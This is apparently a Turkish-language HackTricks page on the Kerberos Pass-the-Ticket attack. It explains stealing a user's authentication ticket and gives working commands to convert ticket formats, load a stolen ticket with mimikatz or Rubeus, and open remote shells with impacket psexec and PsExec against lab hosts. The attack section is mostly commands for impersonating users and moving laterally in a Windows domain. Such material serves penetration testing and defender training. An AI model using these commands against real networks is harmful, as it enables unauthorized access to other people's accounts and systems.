# Pass the Ticket

{{#include ../../banners/hacktricks-training.md}}

## Pass The Ticket (PTT)

**Pass The Ticket (PTT)** saldırı yönteminde, saldırganlar **bir kullanıcının kimlik doğrulama biletini** çalarlar, bunun yerine şifrelerini veya hash değerlerini almazlar. Bu çalınan bilet, **kullanıcının kimliğini taklit etmek** için kullanılır ve bir ağ içindeki kaynaklara ve hizmetlere yetkisiz erişim sağlar.

**Oku**:

- [Windows'tan bilet toplama](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
- [Linux'tan bilet toplama](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)

### **Platformlar arasında Linux ve Windows biletlerini değiştirme**

[**ticket_converter**](https://github.com/Zer1t0/ticket_converter) aracı, yalnızca biletin kendisini ve bir çıktı dosyasını kullanarak bilet formatlarını dönüştürür.
```bash
python ticket_converter.py velociraptor.ccache velociraptor.kirbi
Converting ccache => kirbi

python ticket_converter.py velociraptor.kirbi velociraptor.ccache
Converting kirbi => ccache
```
Windows'da [Kekeo](https://github.com/gentilkiwi/kekeo) kullanılabilir.

### Pass The Ticket Saldırısı
```bash:Linux
export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
```

```bash:Windows
#Load the ticket in memory using mimikatz or Rubeus
mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi"
.\Rubeus.exe ptt /ticket:[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi
klist #List tickets in cache to cehck that mimikatz has loaded the ticket
.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
```
## Referanslar

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)

{{#include ../../banners/hacktricks-training.md}}
